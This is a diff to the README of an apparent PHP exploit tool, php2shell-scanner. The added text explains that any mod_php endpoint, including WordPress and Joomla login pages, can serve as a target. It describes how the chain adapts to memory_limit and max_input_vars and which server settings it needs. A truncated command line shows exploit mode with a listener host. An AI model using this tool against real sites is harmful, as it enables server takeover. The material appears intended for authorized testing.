@@ -92,6 +92,23 @@ php2shell-scanner --target http://localhost:9080 --exploit --lhost 10.1
 
 If you already serve a shell script somewhere (any path, plain text), pass `--no-serve` and point `--serve-host/--serve-port` at it.
 
+## Generic PHP targets (WordPress, Joomla, ...)
+
+Any URL served by mod_php is a valid target — the exploit never needs target-side files and only speaks multipart HTTP to the endpoint (WordPress's `/wp-login.php`, Joomla's `/index.php`, etc. all work as `--target` values).
+
+What the chain does adapt to automatically (measured from the target's own error output during verification):
+
+- **memory_limit** — parsed from the OOM fatal; the OOM field is auto-sized to exceed it (deep probing escalates body sizes past the template's 20 MiB ceiling).
+- **max_input_vars** — parsed from the input-variables warning; the trigger requests' field counts scale to exceed it.
+
+What is **not** generically adaptable — the chain's heap calibration is tied to the official-image lab profile, so exploitation additionally requires:
+
+- `memory_limit=8M`-class settings (a higher limit changes the OOM abort pattern the leak stages are calibrated around; the scanner prints a warning when it detects this);
+- Apache prefork + mod_php with a single worker (php-fpm and multi-worker setups are inherently outside this chain);
+- `display_errors=On`.
+
+Targets that fail these constraints get an explicit diagnosis (detected `memory_limit`, `max_input_vars`, and why the chain won't run) instead of a mysterious failure.
+
 The chain requires the same conditions as the public PoCs: Apache prefork + mod_php, `display_errors=1`, `memory_limit=8M`, `max_input_vars=1000`, single worker, `KeepAlive Off`, and an amd64 PHP 8.4/8.5 build whose libphp offsets match the profile (heap geometry is build- and environment-sensitive; leaks are retried and rotate the worker between attempts). Authorized testing only.
 
 ## Tests and CI
